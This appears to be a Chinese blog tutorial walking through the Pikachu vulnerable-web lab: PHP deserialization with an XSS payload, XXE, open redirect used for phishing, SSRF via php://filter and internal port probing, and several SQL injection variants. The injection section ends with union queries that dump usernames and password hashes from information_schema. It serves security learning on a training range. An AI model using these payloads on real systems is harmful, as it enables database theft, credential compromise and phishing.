<p>在敏感信息泄露的靶场中我们查看源码可以看到<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-10-33-15.png" alt="信息泄露" class="lazyload"><br>登录后可产看页面信息，退出后直接访问登录后的页面也能成功访问<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-10-36-56.png" alt="登录后的信息" class="lazyload"></p>
<h3 id="php反序列化漏洞"><a href="#php反序列化漏洞" class="headerlink" title="php反序列化漏洞"></a>php反序列化漏洞</h3><p>在理解之前首先需要明白php中的serialize()&amp;unserialize()函数<br>**序列化serialize()**序列化说通俗点就是把一个对象变成可以传输的字符串,比如下面是一个对象:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">S</span></span>&#123;<br>     <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>=<span class="hljs-string">&quot;pikachu&quot;</span>;<br> &#125;<br> <span class="hljs-variable">$s</span>=<span class="hljs-keyword">new</span> S(); <span class="hljs-comment">//创建一个对象</span><br> serialize(<span class="hljs-variable">$s</span>); <span class="hljs-comment">//把这个对象进行序列化</span><br> 序列化后得到的结果是这个样子的:O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;S&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;pikachu&quot;</span>;&#125;<br>     O:代表<span class="hljs-keyword">object</span><br>     <span class="hljs-number">1</span>:代表对象名字长度为一个字符<br>     S:对象的名称<br>     <span class="hljs-number">1</span>:代表对象里面有一个变量<br>     s:数据类型<br>     <span class="hljs-number">4</span>:变量名称的长度<br>     test:变量名称<br>     s:数据类型<br>     <span class="hljs-number">7</span>:变量值的长度<br>     pikachu:变量值<br></code></pre></td></tr></table></figure>

<p>**反序列化unserialize()**就是把被序列化的字符串还原为对象,然后在接下来的代码中继续使用。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$u</span>=unserialize(<span class="hljs-string">&quot;O:1:&quot;</span>S<span class="hljs-string">&quot;:1:&#123;s:4:&quot;</span>test<span class="hljs-string">&quot;;s:7:&quot;</span>pikachu<span class="hljs-string">&quot;;&#125;&quot;</span>);<br>   <span class="hljs-keyword">echo</span> <span class="hljs-variable">$u</span>-&gt;test; <span class="hljs-comment">//得到的结果为pikachu</span><br></code></pre></td></tr></table></figure>

<p>序列化和反序列化本身没有问题,但是如果反序列化的内容是用户可以控制的,且后台不正当的使用了PHP中的魔法函数,就会导致安全问题</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">常见的几个魔法函数:<br>       __construct()当一个对象创建时被调用<br><br>       __destruct()当一个对象销毁时被调用<br><br>       __toString()当一个对象被当作一个字符串使用<br><br>       __sleep() 在对象在被序列化之前运行<br><br>       __wakeup将在序列化之后立即被调用<br><br>       漏洞举例:<br><br>       <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">S</span></span>&#123;<br>           <span class="hljs-keyword">var</span> <span class="hljs-variable">$test</span> = <span class="hljs-string">&quot;pikachu&quot;</span>;<br>           <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>               <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;test;<br>           &#125;<br>       &#125;<br>       <span class="hljs-variable">$s</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;test&#x27;</span>];<br>       @<span class="hljs-variable">$unser</span> = unserialize(<span class="hljs-variable">$a</span>);<br><br>       payload:O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;S&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>;s:<span class="hljs-number">29</span>:<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>;&#125;<br><br></code></pre></td></tr></table></figure>

<p>打开靶场进行试验：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-12-13-34.png" alt="演示" class="lazyload"><br>在将序列化后的类执行时，可能会调用相应的构造方法，通过这些构造方法，就会对反序列化的代码执行，造成一些不可预计的后果。但是在实际情况中，我们往往需要构造多种payload，来测试出后台往往是使用哪种构造方法，并使用。(序列化漏洞一般在白盒测试中发现需要知道源代码)</p>
<h3 id="xxe-xml外部实体攻击"><a href="#xxe-xml外部实体攻击" class="headerlink" title="xxe(xml外部实体攻击)"></a>xxe(xml外部实体攻击)</h3><p>XXE -“xml external entity injection”既”xml外部实体注入漏洞”。<br>概括一下就是”攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,导致问题”也就是说服务端接收和解析了来自用户端的xml数据,而又没有做严格的安全控制,从而导致xml外部实体注入。<br>xml：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--第一部分: XML声明-- &gt;</span><br><span class="hljs-comment">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="hljs-comment">&lt;!--第二部分:文档类型定义DTID- &gt;</span><br><span class="hljs-comment">&lt;!DOCTYPE note[ &lt;!--定义此文档是 note类型的文档--&gt;</span> <br><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">entity</span> - <span class="hljs-meta-keyword">name</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;URL/URL&quot;</span>&gt;</span> &lt;!- 外部实体声 明--&gt;<br>]]&gt;<br>&lt;1--第三部分:文档元&gt;<br><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">to</span>&gt;</span>Dave<span class="hljs-tag">&lt;/<span class="hljs-name">to</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span> Tom<span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span> Reminder <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>You are a good man<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>DTD：Document Type Definition即文档类型定义，用来为XML文档定义语义约束。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">1.DTD内部声明<br>&lt;!DOCTYPE 根元素[元素声明]&gt;<br>2. DTD外部引用<br>&lt;!DOCTYPE根元素名称SYSTEM “&quot;外部DTD的URI&quot; &gt;<br>3.引用公共DTD<br>&lt;!DOCTYPE根元素名称PUBLIC &quot;DTD标识名” “公用DTD的URI” &gt;<br></code></pre></td></tr></table></figure>

<p>如果一个接口支持接收xml数据，且没有对xml数据做任何安全上的措施，就可能导致XXE漏洞。simplexml load string()函数转换形式良好的XML字符串为SimpleXMLElement对象XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致攻击者可以构造一个恶意的XML。</p>
<p>打开靶场我们输入</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version = &quot;1.0&quot;?&gt;</span> <br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">note</span> [     <span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">hacker</span> <span class="hljs-meta-string">&quot;xxe&quot;</span>&gt;</span> ]&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;hacker;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>结果：<img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-12-52-17.png" alt="结果" class="lazyload"></p>
<p>具体的关于xml实体的介绍,网络上有很多,自己动手先查一下。现在很多语言里面对应的解析xml的函数默认是禁止解析外部实体内容的,从而也就直接避免了这个漏洞。以PHP为例,在PHP里面解析xml用的是libxml,其在≥2.9.0的版本中,默认是禁止解析xml外部实体内容的。需要对xml进行学习</p>
<h3 id="不安全的url重定向"><a href="#不安全的url重定向" class="headerlink" title="不安全的url重定向"></a>不安全的url重定向</h3><p>不安全的url跳转问题可能发生在一切可以执行url地址跳转的地方，如果后端采用了前端传来的（用户的参数，之前预埋在前端页面的url地址）参数作为跳转的目的地，又没有做判断的话就可能发生跳错对象的问题。<br>url跳转最直接的危害是：</p>
<ul>
<li>钓鱼：攻击者使用漏洞方的域名（如一个出名公司的域名往往会让用户放心的点击）做掩盖，而最终跳转到钓鱼网站</li>
</ul>
<p>这个漏洞比较简单，我们来学习一下：打开靶场<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-13-32-22.png" alt="靶场" class="lazyload"><br>看到有几个链接我们点击看看发现第三个跳转到了不安全的url概述第四个的url有参数，查看源码可看到地址我们添加一条点击发现可以成功跳转到我们指定的网站<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-13-40-53.png" alt="源码" class="lazyload"><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-13-41-56.png" alt="网站跳转" class="lazyload"><br>熟练后可以的定向转到提前搭建好的恶意站点。在这里我们的应用主要是发现不做后端检测跳转的网站利用它去做钓鱼。</p>
<h3 id="SSRF（服务器端请求伪造）"><a href="#SSRF（服务器端请求伪造）" class="headerlink" title="SSRF（服务器端请求伪造）"></a>SSRF（服务器端请求伪造）</h3><p>SSRF(Server-Side Request Forgery:服务器端请求伪造)其形成的原因大都是由于<em>服务端</em>提供了<em>从其他服务器</em>应用获取数据的功能,但又<em>没有对目标地址做严格过滤与限制</em>，导致攻击者可以传入<em>任意</em>的地址来<em>让后端服务器对其发起请求</em>,并返回对该目标地址请求的数据。<br>数据流：攻击者-&gt;服务器-&gt;目标地址<br>根据后台使用的函数不同，对应的影响和利用方式也不同</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//PHP中下面函数的使用不当会导致SSRF:</span><br>file_get_contents()<br>fsockopen()<br>curl_exec()<br></code></pre></td></tr></table></figure>

<p>如果一定要通过后台服务器远程去对用户指定(“或者预埋在前端的请求”)的地址进行资源请求,则请做好目标地址的过滤。<br>演示：打开靶场ssrf（curl）点击a标签显示了一首诗和一个1<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-14-03-01.png" alt="点击尝试" class="lazyload"><br>同样可以改成百度的网址访问百度<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-14-04-52.png" alt="访问百度" class="lazyload"></p>
<p>打开ssrf(file_get_content)，点击链接，看链接地址<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-14-07-33.png" alt="又跳转" class="lazyload"><br>同样修改百度的地址<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-14-10-26.png" alt="成功跳转" class="lazyload"><br>尝试读取PHP文件的源码:php://filter/read=convert.base64-encode/resource=ssrf.php<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-14-13-08.png" alt="读取成功显示到了页面" class="lazyload"><br>将信息编码形式转换即可看到文件内容。<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-14-15-32.png" alt="成功获取到信息" class="lazyload"><br>内网请求:<a target="_blank" rel="noopener" href="http://x.x.x.x/xx.index">http://x.x.x.x/xx.index</a><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-14-26-57.png" alt="内网请求" class="lazyload"><br>测试本地端口是否开放：<a target="_blank" rel="noopener" href="http://192.168.23.128:22/">http://192.168.23.128:22</a> (探测这台主机内网的这台主句的22端口是否开启)<br>ssrf要根据后端使用的函数不同利用的方法不同</p>
<h3 id="sql-inject（SQL注入）"><a href="#sql-inject（SQL注入）" class="headerlink" title="sql inject（SQL注入）"></a>sql inject（SQL注入）</h3><h4 id="sql-inject漏洞原理概述"><a href="#sql-inject漏洞原理概述" class="headerlink" title="sql inject漏洞原理概述"></a>sql inject漏洞原理概述</h4><p>在owasp发布的top10漏洞中，注入漏洞一直是危害且排名第一，其中主要指的是SQL Inject漏洞，数据库注入漏洞主要是开发人员在构建代码时，没有对输入边界进行安全考虑，导致攻击者通过合法输入点提交一些精心构造的语句，从而欺骗后台数据库对其进行执行，导致数据库泄露的一种漏洞。<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-14-58-09.png" alt="注入" class="lazyload"><br>正常输入：1 select email from users where id = 1<br>非法输入：1 or 1=1 select email from users where id = 1</p>
<h4 id="SQL-Inject攻击流程"><a href="#SQL-Inject攻击流程" class="headerlink" title="SQL Inject攻击流程"></a>SQL Inject攻击流程</h4><ol>
<li>注入点探测：<br>自动方式：使用web漏洞扫描工具，自动进行注入点发现<br>手动方式：手工构造sql inject测试语句进行注入点检测发现</li>
<li>信息获取：<br>通过注入点获取期望获得的数据：<ul>
<li>环境信息：数库类型、版本，操作系统类型版本、用户信息</li>
<li>数据库信息：数据库名、表、字段、字段内容</li>
</ul>
</li>
<li>获取权限<br>获取操作系统权限：通过数据库执行shell、上传木马</li>
</ol>
<h4 id="常见注入点的类型"><a href="#常见注入点的类型" class="headerlink" title="常见注入点的类型"></a>常见注入点的类型</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs txet">数字型：user_id = $id<br>字符型：user_id = &#x27;$id&#x27;<br>搜索型：text LIKE &#x27;%&#123;$_get[&#x27;search&#x27;]&#125;&#x27;<br></code></pre></td></tr></table></figure>

<h4 id="注入方式"><a href="#注入方式" class="headerlink" title="注入方式"></a>注入方式</h4><h5 id="pikachu-SQL-Inject-数字型"><a href="#pikachu-SQL-Inject-数字型" class="headerlink" title="pikachu-SQL-Inject-数字型"></a>pikachu-SQL-Inject-数字型</h5><p><strong>post型注入演示</strong> 我们打开靶场，下拉框随意点击一个数字查看url<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-15-21-50.png" alt="打开靶场" class="lazyload"><br>发现url中无参数提交方式是post方式。<br>首先测试这个输入点是否存在漏洞，正常逻辑我们输入一个id，之后返回数据，因该是后台在数据库进行查询，返回了id相对应的姓名和邮箱可以认为语句为：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> 字段<span class="hljs-number">1</span>，字段<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> 表明 <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span> 值;<br></code></pre></td></tr></table></figure>

<p>后端接收到的应是<code>$id=$post[&#39;id&#39;]</code>之后把接受道德参数传进去<br>我们点击数字2，进行查询，之后打开burp查看抓包<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-15-28-22.png" alt="抓取数据包" class="lazyload"><br>由于是post型注入我们只能将注入语句加入数据包发送给后端，将抓到的数据包发送到repeater中，我们在输入点输入一段payload：2 or 1=1，点击提交<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-15-35-23.png" alt="重放" class="lazyload"><br>可以看到返回了所有用户和邮箱信息</p>
<h5 id="pikachu-SQL-Inject-字符型注入"><a href="#pikachu-SQL-Inject-字符型注入" class="headerlink" title="pikachu-SQL-Inject-字符型注入"></a>pikachu-SQL-Inject-字符型注入</h5><p><strong>get型注入</strong>我们打开靶场，随意输入一段字符，点击提交，提示用户名不存在。发现请求在url中<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-15-39-26.png" alt="靶场" class="lazyload"><br>正常返回是两个字段，用户名和邮箱。我们可以对后台运行做出猜想</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> 字段<span class="hljs-number">1</span>，字段<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> 表名 <span class="hljs-keyword">where</span> username<span class="hljs-operator">=</span>&quot;值&quot;;<br></code></pre></td></tr></table></figure>

<p>后台接受<code>$uname=$_GET[&#39;username&#39;]</code><br>与xss类似我们要构成一个合法的闭合。字符串需要加单引号才合法。我们需要把前后两个单引号注释掉。输入<code>kb &#39; or 1=1 #</code>第一个单引号会将前面的单引号闭合，后面的#号会注释掉后面的单引号。我们尝试提交.<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-15-46-44.png" alt="测试" class="lazyload"><br>可以看到注入成功所有的信息都展示出来了</p>
<h5 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h5><p>我们打开搜索型注入靶场，尝试输入字符c，点击提交查看结果<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-15-49-14.png" alt="结果" class="lazyload"><br>返回了所有含c的用户名和uid,我们猜测后台运行：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> 表名 <span class="hljs-keyword">where</span> username <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%c%&#x27;</span>;<br></code></pre></td></tr></table></figure>

<p>这种查询比get多了%号，我们要想办法构造一个合法的闭合。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> 表名 <span class="hljs-keyword">where</span> username <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%c%&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> #<span class="hljs-operator">%</span><span class="hljs-string">&#x27;;</span><br></code></pre></td></tr></table></figure>

<p>我们输入构造的字符串<code>c%&#39; or 1=1 #</code>查看结果<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-15-58-18.png" alt="结果" class="lazyload"><br>只要理解、猜测后台如何拼接，设置合法的语句构造闭合就能成功注入</p>
<h5 id="XX型注入"><a href="#XX型注入" class="headerlink" title="XX型注入"></a>XX型注入</h5><p>尝试盲闭合无果后，查看端代码，要闭合)<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-16-04-56.png" alt="代码" class="lazyload"><br>我们尝试构造闭合<code>c&#39;) or 1=1 #</code>输入查看结果<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-16-07-48.png" alt="结果" class="lazyload"><br>成功闭合获取到了数据，所以提示管tmd什么型构造出闭合就是牛</p>
<h5 id="SQL-Inject漏洞手工测试：基于union联合查询的信息获取（select）"><a href="#SQL-Inject漏洞手工测试：基于union联合查询的信息获取（select）" class="headerlink" title="SQL Inject漏洞手工测试：基于union联合查询的信息获取（select）"></a>SQL Inject漏洞手工测试：基于union联合查询的信息获取（select）</h5><p><strong>union联合查询</strong> 可以通过联合查询来查询指定的数据<br>用法举例：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> username,password <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> 字段<span class="hljs-number">1</span>，字段<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> 表名 <br></code></pre></td></tr></table></figure>

<p><strong>联合查询的字段数量要和主查询一致！！！</strong><br>打开字符型注入,首先用order by猜测有几个字段，我们输入<code>a&#39; order by 5 #</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-16-19-52.png" alt="猜字段" class="lazyload"><br>正常报错说明主查寻中有两个字段，确认字段后构建union联合查询<br><code>a&#39; union  select database(),user()#</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-16-24-59.png" alt="union查询" class="lazyload"><br>这时就会将数据库名称，当前用户权限显示出来<br>我们还可以查询版本<code>a&#39; union  select version(),4#</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-16-27-22.png" alt="数据库版本" class="lazyload"><br>这里的4直接打印出来了，还可以查询其他东西，一下数据库的相关知识仅供参考</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">Select version(); //取的数据库版本<br>Select database(); //取得当前的数据库<br>Select user(); //取得当前登录的用户<br>order by X //对查询的结果进行排序,按照第X列进行排序，默认数字0-9 ,字母a-z<br>思路:对查询的结果使用order by按照指定的列进行排序,如果指定的列不存在,数据库会报错。通过报错判断查询结果的列数,从而确定主查询的字段数。<br></code></pre></td></tr></table></figure>

<h5 id="通过information-schema拿下数据库手工测试完整案例"><a href="#通过information-schema拿下数据库手工测试完整案例" class="headerlink" title="通过information_schema拿下数据库手工测试完整案例"></a>通过information_schema拿下数据库手工测试完整案例</h5><p>mysql小知识：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">在mysq|中,自带的information_schema这个表里面存放了大量的重要信息。具体如下:<br>如果存在注入点的话，可以直接尝试对该数据库进行访问，从而获取更多的信息。<br>比如:<br>SCHEMATA表:提供了当前mysq|实例中所有数据库的信息。是show databases的结果取之此表。<br>TABLES表:提供了关于数据库中的表的信息(包括视图)。详细表述了某个表属于哪个schema ,表类型,表引擎,创建时间等信息。是show tables from schemaname的结果取之此表。<br>COLUMNS表:提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是show columns from schemaname.tablename的结果取之此表。<br></code></pre></td></tr></table></figure>

<p>以字符型为例，我们站在测试者的角度判断是否存在sql注入，以及如何获取数据。<br>我们首先打开靶场的字符型，我们先输入个单引号，提交发现报错<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-16-34-21.png" alt="出错" class="lazyload"><br>在单引号处出现了语法错误，那么我们的单引号已经被拼接到sql中执行了，这就说明这里是sql注入点，他会把当前的输入当作数据库查询语句的一部分逻辑去处理。<br>我们猜测的是字符型的，去做一个小测试，输入<code>a&#39; or 1=1#</code>点击提交<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-16-39-55.png" alt="数据" class="lazyload"><br>结果发现可以遍历数据，但是现在的结果并不能满足我，我要获取他的基本信息，我们要使用union联合查询获取信息，首先我们需要使用order by来猜测字段数，输入<code>a&#39; order by 3#</code>出现报错，在输入<code>a&#39; order by 2#</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-16-45-23.png" alt="猜字段" class="lazyload"><br>成功猜出主查询中有两个字段，确定字段数量后我要用联合查询来获取information_schema中的数据，至少要知道数据库名称，构造联合查询的语句<code>a&#39; union select database(),user()#</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-16-48-26.png" alt="成功获取" class="lazyload"><br>成功获取到数据库的名称为pikachu。拿到名称后我们就可以通过information_schema去获取数据。通过union联合查询，然后通过information_schema去获取pikachu一共有多少个表，表的名称是什么<br>构造联合查询语句如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">a&#x27; union select table_schema,table_name from information_schema.tables where table_schema=&#x27;pikachu&#x27; #<br></code></pre></td></tr></table></figure>

<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-16-57-01.png" alt="查表名" class="lazyload"><br>pikachu数据库所有表的名称被我们爆出来了，我们进一步分析，我们发现有一个叫做users的表，我们可以猜测这是存放用户名和密码的表，构造联合查询通过information_schema表查询出users表的字段名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">a&#x27; union select table_name,column_name from information_schema.columns where table_name=&#x27;users&#x27;#<br></code></pre></td></tr></table></figure>

<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-17-01-38.png" alt="表的字段名" class="lazyload"><br>我们发现有账号和密码，现在来获取账号和密码，union联合查询的语句为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">a&#x27; union select username,password from users#<br></code></pre></td></tr></table></figure>

<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-17-04-10.png" alt="账号密码" class="lazyload"></p>
<p>账号密码到手，但发现密码是经过加密处理的，通过长度判断应该是md5加密，通过网上碰撞解出密文。<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-17-06-46.png" alt="解密密码" class="lazyload"><br>这时我们的目的已经达成获取到了管理员的账号和密码。</p>
<h5 id="SQL-Inject漏洞手工测试基于报错信息获取（select-delete-update-insert）"><a href="#SQL-Inject漏洞手工测试基于报错信息获取（select-delete-update-insert）" class="headerlink" title="SQL Inject漏洞手工测试基于报错信息获取（select/delete/update/insert）"></a>SQL Inject漏洞手工测试基于报错信息获取（select/delete/update/insert）</h5><p>技巧思路：在mysql中使用一些指定的函数来制造报错，从而报错信息中获取设定的信息。<br>select/insert/update/delete都可以用来报错获取信息<br>背景条件：后台没有屏蔽数据库报错信息，在语法发生错误时会在前端输出。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">基于报错的信息获取——三个常用的用来报错的函数<br>updatexml() :函数是MYSQL对XML文档数据进行查询和修改的XPATH函数。<br>extractvalue():函数也是MYSQL对XML文档数据进行查询的XPATH函数。<br>floor(): MYSQL中用来取整的函数。<br></code></pre></td></tr></table></figure>

<p>**updatexml():**作用：改变（查找并替换）xml文档中符合条件的节点的值<br>语法:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml">UPDATEXML(xml document,XPathstring,new_value)<br>第一个参数：fiedname是string格式，为表中的字段名<br>第二个参数：XPathstring（Xath格式的字符串）<br>第三个参数：new.balue,String格式，替换查找到的符合条件的<br></code></pre></td></tr></table></figure>

